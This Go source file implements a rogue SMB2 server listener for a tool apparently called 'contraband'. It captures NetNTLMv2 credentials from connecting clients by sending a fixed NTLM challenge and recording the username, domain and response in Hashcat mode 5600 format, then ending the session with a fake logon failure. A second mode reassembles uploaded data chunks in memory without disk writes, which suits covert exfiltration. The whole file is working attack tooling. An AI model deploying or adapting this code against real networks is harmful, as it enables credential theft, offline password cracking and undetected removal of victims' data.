package listeners

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"github.com/shehzade/contraband/pkg/common"
	"github.com/shehzade/contraband/pkg/server"
)

// SMBServerListener implements a dual-mode in-memory SMB2 server (TCP 445).
// In hash-capture mode, it captures NetNTLMv2 credentials using fixed challenge 1122334455667788.
// In file-transfer mode, it accepts uploaded chunks in memory and passes them directly
// to ledger.AssembleChunk with ZERO disk writes.
type SMBServerListener struct {
	mu          sync.Mutex
	bindAddr    string
	port        int
	boundPort   int
	mode        string // "hash-capture", "file-transfer", or "dual"
	ledger      server.Ledger
	ln          net.Listener
	cancel      context.CancelFunc
	closed      bool
	connsMu     sync.Mutex
	activeConns map[net.Conn]struct{}
}

// NewSMBServerListener constructs a new SMB server listener.
func NewSMBServerListener(bindAddr string, port int, mode string) *SMBServerListener {
	if bindAddr == "" {
		bindAddr = "127.0.0.1"
	}
	if port < 0 {
		port = 445
	}
	if mode == "" {
		mode = "hash-capture"
	}
	return &SMBServerListener{
		bindAddr:    bindAddr,
		port:        port,
		mode:        mode,
		activeConns: make(map[net.Conn]struct{}),
	}
}

func (l *SMBServerListener) Name() string {
	return "smb"
}

func (l *SMBServerListener) Protocol() string {
	if l.mode == "file-transfer" {
		return common.ProtoSMBFile
	}
	return common.ProtoSMBHash
}

func (l *SMBServerListener) Ports() []int {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.boundPort > 0 {
		return []int{l.boundPort}
	}
	return []int{l.port}
}

// BoundPort returns the actual bound TCP port.
func (l *SMBServerListener) BoundPort() int {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.boundPort
}

// Start begins listening for SMB2 connections.
func (l *SMBServerListener) Start(ctx context.Context, ledger server.Ledger) error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.ln != nil {
		return errors.New("smb listener already started")
	}

	l.ledger = ledger
	ctx, cancel := context.WithCancel(ctx)
	l.cancel = cancel
	l.closed = false

	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", l.bindAddr, l.port))
	if err != nil {
		return fmt.Errorf("failed to bind smb listener: %w", err)
	}

	l.ln = ln
	l.boundPort = ln.Addr().(*net.TCPAddr).Port

	go l.acceptLoop(ctx, ln)
	return nil
}

// Stop cleanly terminates the SMB server listener.
func (l *SMBServerListener) Stop() error {
	l.mu.Lock()
	if l.closed {
		l.mu.Unlock()
		return nil
	}
	l.closed = true
	if l.cancel != nil {
		l.cancel()
	}
	var lnErr error
	if l.ln != nil {
		lnErr = l.ln.Close()
	}
	l.mu.Unlock()

	l.connsMu.Lock()
	for c := range l.activeConns {
		_ = c.Close()
	}
	l.activeConns = make(map[net.Conn]struct{})
	l.connsMu.Unlock()

	return lnErr
}

func (l *SMBServerListener) acceptLoop(ctx context.Context, ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				if l.closed {
					return
				}
				time.Sleep(10 * time.Millisecond)
				continue
			}
		}

		l.connsMu.Lock()
		l.activeConns[conn] = struct{}{}
		l.connsMu.Unlock()

		go func(c net.Conn) {
			defer func() {
				_ = c.Close()
				l.connsMu.Lock()
				delete(l.activeConns, c)
				l.connsMu.Unlock()
			}()
			l.handleConn(c)
		}(conn)
	}
}

func (l *SMBServerListener) handleConn(conn net.Conn) {
	clientIP := ""
	if conn != nil && conn.RemoteAddr() != nil {
		if host, _, err := net.SplitHostPort(conn.RemoteAddr().String()); err == nil {
			clientIP = host
		} else {
			clientIP = conn.RemoteAddr().String()
		}
	}

	var currentSessionID uint64 = 0x0000000100000001
	var currentTreeID uint32 = 1
	var fileID [16]byte
	copy(fileID[:], []byte("CONTRABANDFILE01"))

	for {
		_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		// Read NetBIOS framing (4 bytes)
		var nbHeader [4]byte
		if _, err := io.ReadFull(conn, nbHeader[:]); err != nil {
			return
		}
		length := (int(nbHeader[1]) << 16) | (int(nbHeader[2]) << 8) | int(nbHeader[3])
		if length <= 0 || length > 1048576 {
			return
		}

		smbPayload := make([]byte, length)
		if _, err := io.ReadFull(conn, smbPayload); err != nil {
			return
		}

		if len(smbPayload) < 64 || smbPayload[0] != 0xFE || smbPayload[1] != 'S' || smbPayload[2] != 'M' || smbPayload[3] != 'B' {
			return
		}

		command := binary.LittleEndian.Uint16(smbPayload[12:14])
		messageID := binary.LittleEndian.Uint64(smbPayload[24:32])
		sessionID := binary.LittleEndian.Uint64(smbPayload[40:48])

		switch command {
		case 0x0000: // SMB2_NEGOTIATE
			resp := l.buildNegotiateResponse(messageID)
			if err := l.writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0001: // SMB2_SESSION_SETUP
			resp, shouldClose := l.handleSessionSetup(conn, smbPayload, messageID, sessionID, currentSessionID)
			if len(resp) > 0 {
				if err := l.writeNetBIOSPacket(conn, resp); err != nil {
					return
				}
			}
			if shouldClose {
				return
			}

		case 0x0003: // SMB2_TREE_CONNECT
			resp := l.buildTreeConnectResponse(messageID, currentSessionID, currentTreeID)
			if err := l.writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0005: // SMB2_CREATE
			resp := l.buildCreateResponse(messageID, currentSessionID, currentTreeID, fileID)
			if err := l.writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0009: // SMB2_WRITE
			resp := l.handleWrite(smbPayload, messageID, currentSessionID, currentTreeID, clientIP)
			if err := l.writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0006: // SMB2_CLOSE
			resp := l.buildCloseResponse(messageID, currentSessionID, currentTreeID, fileID)
			if err := l.writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0004: // SMB2_TREE_DISCONNECT
			resp := l.buildTreeDisconnectResponse(messageID, currentSessionID, currentTreeID)
			if err := l.writeNetBIOSPacket(conn, resp); err != nil {
				return
			}

		case 0x0002: // SMB2_LOGOFF
			resp := l.buildLogoffResponse(messageID, currentSessionID)
			_ = l.writeNetBIOSPacket(conn, resp)
			return

		default:
			return
		}
	}
}

func (l *SMBServerListener) writeNetBIOSPacket(conn net.Conn, data []byte) error {
	header := make([]byte, 4)
	length := len(data)
	header[0] = 0x00
	header[1] = byte((length >> 16) & 0xFF)
	header[2] = byte((length >> 8) & 0xFF)
	header[3] = byte(length & 0xFF)
	_ = conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func (l *SMBServerListener) buildSMB2Header(command uint16, status uint32, flags uint32, messageID uint64, treeID uint32, sessionID uint64) []byte {
	buf := make([]byte, 64)
	buf[0] = 0xFE
	buf[1] = 'S'
	buf[2] = 'M'
	buf[3] = 'B'
	binary.LittleEndian.PutUint16(buf[4:6], 64)
	binary.LittleEndian.PutUint16(buf[6:8], 0) // CreditCharge
	binary.LittleEndian.PutUint32(buf[8:12], status)
	binary.LittleEndian.PutUint16(buf[12:14], command)
	binary.LittleEndian.PutUint16(buf[14:16], 1)                // CreditResponse
	binary.LittleEndian.PutUint32(buf[16:20], flags|0x00000001) // SMB2_FLAGS_SERVER_TO_REDIR
	binary.LittleEndian.PutUint32(buf[20:24], 0)                // NextCommand
	binary.LittleEndian.PutUint64(buf[24:32], messageID)
	binary.LittleEndian.PutUint32(buf[32:36], 0) // Reserved
	binary.LittleEndian.PutUint32(buf[36:40], treeID)
	binary.LittleEndian.PutUint64(buf[40:48], sessionID)
	return buf
}

func (l *SMBServerListener) buildNegotiateResponse(messageID uint64) []byte {
	hdr := l.buildSMB2Header(0x0000, 0, 0, messageID, 0, 0)
	body := make([]byte, 65)
	binary.LittleEndian.PutUint16(body[0:2], 65)                              // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], 0x01)                            // SecurityMode (Signing enabled)
	binary.LittleEndian.PutUint16(body[4:6], 0x0210)                          // DialectRevision (SMB 2.1)
	binary.LittleEndian.PutUint16(body[6:8], 1)                               // NegotiateContextCount
	copy(body[8:24], []byte("CONTRABANDSERVER"))                              // ServerGuid (16 bytes)
	binary.LittleEndian.PutUint32(body[24:28], 0x01)                          // Capabilities
	binary.LittleEndian.PutUint32(body[28:32], 65536)                         // MaxTransactSize
	binary.LittleEndian.PutUint32(body[32:36], 65536)                         // MaxReadSize
	binary.LittleEndian.PutUint32(body[36:40], 65536)                         // MaxWriteSize
	binary.LittleEndian.PutUint64(body[40:48], uint64(time.Now().UnixNano())) // SystemTime
	binary.LittleEndian.PutUint64(body[48:56], 0)                             // ServerStartTime
	binary.LittleEndian.PutUint16(body[56:58], 128)                           // SecurityBufferOffset
	binary.LittleEndian.PutUint16(body[58:60], 0)                             // SecurityBufferLength
	binary.LittleEndian.PutUint32(body[60:64], 0)                             // Reserved
	body[64] = 0                                                              // Pad

	return append(hdr, body...)
}

func (l *SMBServerListener) handleSessionSetup(conn net.Conn, req []byte, messageID uint64, sessionID uint64, assignedSessionID uint64) ([]byte, bool) {
	if len(req) < 64+24 {
		return nil, true
	}

	secOffset := binary.LittleEndian.Uint16(req[64+12 : 64+14])
	secLength := binary.LittleEndian.Uint16(req[64+14 : 64+16])

	if int(secOffset)+int(secLength) > len(req) {
		return nil, true
	}

	secBlob := req[secOffset : secOffset+secLength]

	// Look for NTLMSSP
	idx := -1
	for i := 0; i+8 <= len(secBlob); i++ {
		if string(secBlob[i:i+8]) == "NTLMSSP\x00" {
			idx = i
			break
		}
	}

	if idx == -1 {
		// Plain anonymous or empty
		hdr := l.buildSMB2Header(0x0001, 0, 0, messageID, 0, assignedSessionID)
		body := make([]byte, 8)
		binary.LittleEndian.PutUint16(body[0:2], 9)
		binary.LittleEndian.PutUint16(body[2:4], 0)
		binary.LittleEndian.PutUint16(body[4:6], 72)
		binary.LittleEndian.PutUint16(body[6:8], 0)
		return append(hdr, body...), false
	}

	ntlmBytes := secBlob[idx:]
	if len(ntlmBytes) < 12 {
		return nil, true
	}

	msgType := binary.LittleEndian.Uint32(ntlmBytes[8:12])

	if msgType == 1 { // NTLMSSP_NEGOTIATE (Type 1)
		// Build Type 2 Challenge with Fixed Challenge: 1122334455667788
		type2 := l.buildNTLMSSPType2Challenge()
		hdr := l.buildSMB2Header(0x0001, 0xC0000016, 0, messageID, 0, assignedSessionID) // STATUS_MORE_PROCESSING_REQUIRED
		body := make([]byte, 8)
		binary.LittleEndian.PutUint16(body[0:2], 9)
		binary.LittleEndian.PutUint16(body[2:4], 0)
		binary.LittleEndian.PutUint16(body[4:6], uint16(64+8))
		binary.LittleEndian.PutUint16(body[6:8], uint16(len(type2)))

		resp := append(hdr, body...)
		resp = append(resp, type2...)
		return resp, false
	}

	if msgType == 3 { // NTLMSSP_AUTH (Type 3)
		user, domain, ntProof, clientBlob, err := l.parseNTLMSSPType3(ntlmBytes)
		if err == nil && len(ntProof) == 16 && len(clientBlob) > 0 {
			// Construct Hashcat Mode 5600: username::domain:challenge:HMAC:blob
			hashcatStr := fmt.Sprintf("%s::%s:%s:%s:%s",
				user, domain, common.FixedNTLMChallenge,
				hex.EncodeToString(ntProof), hex.EncodeToString(clientBlob))

			if common.ValidateNetNTLMv2Hash(hashcatStr) && l.ledger != nil {
				clientIP, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
				_ = l.ledger.RecordCredential(common.CapturedCredential{
					Protocol:  common.ProtoSMBHash,
					Timestamp: time.Now().UTC(),
					ClientIP:  clientIP,
					Username:  user,
					Domain:    domain,
					HashType:  "NetNTLMv2",
					Hash:      hashcatStr,
				})
			}
		}

		if l.mode == "file-transfer" {
			// Accept session for file transfer
			hdr := l.buildSMB2Header(0x0001, 0x00000000, 0, messageID, 0, assignedSessionID) // STATUS_SUCCESS
			body := make([]byte, 8)
			binary.LittleEndian.PutUint16(body[0:2], 9)
			binary.LittleEndian.PutUint16(body[2:4], 0)
			binary.LittleEndian.PutUint16(body[4:6], 72)
			binary.LittleEndian.PutUint16(body[6:8], 0)
			return append(hdr, body...), false
		}

		// In hash-capture mode, return STATUS_LOGON_FAILURE to end probe cleanly
		hdr := l.buildSMB2Header(0x0001, 0xC000006D, 0, messageID, 0, sessionID) // STATUS_LOGON_FAILURE
		body := make([]byte, 8)
		binary.LittleEndian.PutUint16(body[0:2], 9)
		binary.LittleEndian.PutUint16(body[2:4], 0)
		binary.LittleEndian.PutUint16(body[4:6], 72)
		binary.LittleEndian.PutUint16(body[6:8], 0)
		return append(hdr, body...), true
	}

	return nil, true
}

func (l *SMBServerListener) buildNTLMSSPType2Challenge() []byte {
	targetNameBytes := encodeUTF16LE("CONTRABAND")
	headerLen := 48 + len(targetNameBytes)
	buf := make([]byte, headerLen)

	copy(buf[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(buf[8:12], 2) // Type 2 Challenge

	// TargetName SecBuf
	binary.LittleEndian.PutUint16(buf[12:14], uint16(len(targetNameBytes)))
	binary.LittleEndian.PutUint16(buf[14:16], uint16(len(targetNameBytes)))
	binary.LittleEndian.PutUint32(buf[16:20], 48)

	// NegotiateFlags (NTLM2, TargetName, etc.)
	binary.LittleEndian.PutUint32(buf[20:24], 0x00028205)

	// Fixed Server Challenge (1122334455667788)
	copy(buf[24:32], common.FixedNTLMChallengeBytes)

	// Context (8 bytes zero)
	// TargetInfo SecBuf (zero for simple responder)
	binary.LittleEndian.PutUint16(buf[40:42], 0)
	binary.LittleEndian.PutUint16(buf[42:44], 0)
	binary.LittleEndian.PutUint32(buf[44:48], uint32(headerLen))

	copy(buf[48:], targetNameBytes)
	return buf
}

func (l *SMBServerListener) parseNTLMSSPType3(data []byte) (user, domain string, ntProof, clientBlob []byte, err error) {
	if len(data) < 64 {
		return "", "", nil, nil, errors.New("type 3 message too short")
	}

	ntLen := binary.LittleEndian.Uint16(data[20:22])
	ntOffset := binary.LittleEndian.Uint32(data[24:28])

	domainLen := binary.LittleEndian.Uint16(data[28:30])
	domainOffset := binary.LittleEndian.Uint32(data[32:36])

	userLen := binary.LittleEndian.Uint16(data[36:38])
	userOffset := binary.LittleEndian.Uint32(data[40:44])

	if int(domainOffset)+int(domainLen) <= len(data) {
		domainBytes := data[domainOffset : domainOffset+uint32(domainLen)]
		domain = decodeUnicodeOrASCII(domainBytes)
	}

	if int(userOffset)+int(userLen) <= len(data) {
		userBytes := data[userOffset : userOffset+uint32(userLen)]
		user = decodeUnicodeOrASCII(userBytes)
	}

	if int(ntOffset)+int(ntLen) <= len(data) && ntLen >= 16 {
		ntResp := data[ntOffset : ntOffset+uint32(ntLen)]
		ntProof = ntResp[:16]
		clientBlob = ntResp[16:]
	}

	return user, domain, ntProof, clientBlob, nil
}

func (l *SMBServerListener) buildTreeConnectResponse(messageID uint64, sessionID uint64, treeID uint32) []byte {
	hdr := l.buildSMB2Header(0x0003, 0x00000000, 0, messageID, treeID, sessionID)
	body := make([]byte, 16)
	binary.LittleEndian.PutUint16(body[0:2], 16)
	body[2] = 0x01 // ShareType Disk
	body[3] = 0
	binary.LittleEndian.PutUint32(body[4:8], 0)           // ShareFlags
	binary.LittleEndian.PutUint32(body[8:12], 0x00120116) // AccessMask
	return append(hdr, body...)
}

func (l *SMBServerListener) buildCreateResponse(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte) []byte {
	hdr := l.buildSMB2Header(0x0005, 0x00000000, 0, messageID, treeID, sessionID)
	body := make([]byte, 88)
	binary.LittleEndian.PutUint16(body[0:2], 89)
	body[2] = 0 // OplockLevel
	body[3] = 0
	binary.LittleEndian.PutUint32(body[4:8], 1) // CreateAction (FILE_OPENED)
	copy(body[32:48], fileID[:])
	return append(hdr, body...)
}

func (l *SMBServerListener) handleWrite(req []byte, messageID uint64, sessionID uint64, treeID uint32, clientIP string) []byte {
	if len(req) < 64+48 {
		hdr := l.buildSMB2Header(0x0009, 0xC000000D, 0, messageID, treeID, sessionID) // STATUS_INVALID_PARAMETER
		return hdr
	}

	dataOffset := binary.LittleEndian.Uint16(req[64+2 : 64+4])
	dataLength := binary.LittleEndian.Uint32(req[64+4 : 64+8])

	var written uint32 = 0
	if int(dataOffset)+int(dataLength) <= len(req) {
		chunkData := req[dataOffset : int(dataOffset)+int(dataLength)]
		written = uint32(len(chunkData))

		// ZERO DISK WRITES: Process chunk data strictly in-memory
		if len(chunkData) >= common.ChunkHeaderSize && l.ledger != nil {
			var hdr common.ChunkHeader
			if err := hdr.UnmarshalBinary(chunkData[:common.ChunkHeaderSize]); err == nil && hdr.Magic == common.MagicHeader {
				payload := chunkData[common.ChunkHeaderSize:]
				if int(hdr.PayloadLen) <= len(payload) {
					payload = payload[:hdr.PayloadLen]
				}
				_, _, _ = l.ledger.AssembleChunkWithMeta(hdr.Token, hdr.Sequence, hdr.TotalChunks, payload, "", clientIP, common.ProtoSMBFile, 445, clientIP, "")
			}
		}
	}

	hdr := l.buildSMB2Header(0x0009, 0x00000000, 0, messageID, treeID, sessionID)
	body := make([]byte, 16)
	binary.LittleEndian.PutUint16(body[0:2], 17)
	binary.LittleEndian.PutUint32(body[4:8], written)
	return append(hdr, body...)
}

func (l *SMBServerListener) buildCloseResponse(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte) []byte {
	hdr := l.buildSMB2Header(0x0006, 0x00000000, 0, messageID, treeID, sessionID)
	body := make([]byte, 60)
	binary.LittleEndian.PutUint16(body[0:2], 60)
	return append(hdr, body...)
}

func (l *SMBServerListener) buildTreeDisconnectResponse(messageID uint64, sessionID uint64, treeID uint32) []byte {
	hdr := l.buildSMB2Header(0x0004, 0x00000000, 0, messageID, treeID, sessionID)
	body := make([]byte, 4)
	binary.LittleEndian.PutUint16(body[0:2], 4)
	return append(hdr, body...)
}

func (l *SMBServerListener) buildLogoffResponse(messageID uint64, sessionID uint64) []byte {
	hdr := l.buildSMB2Header(0x0002, 0x00000000, 0, messageID, 0, sessionID)
	body := make([]byte, 4)
	binary.LittleEndian.PutUint16(body[0:2], 4)
	return append(hdr, body...)
}

func encodeUTF16LE(s string) []byte {
	runes := utf16.Encode([]rune(s))
	b := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(b[i*2:], r)
	}
	return b
}

func decodeUnicodeOrASCII(b []byte) string {
	if len(b) >= 2 && b[1] == 0 {
		u16s := make([]uint16, len(b)/2)
		for i := 0; i < len(u16s); i++ {
			u16s[i] = binary.LittleEndian.Uint16(b[i*2:])
		}
		return strings.TrimRight(string(utf16.Decode(u16s)), "\x00")
	}
	return strings.TrimRight(string(b), "\x00")
}
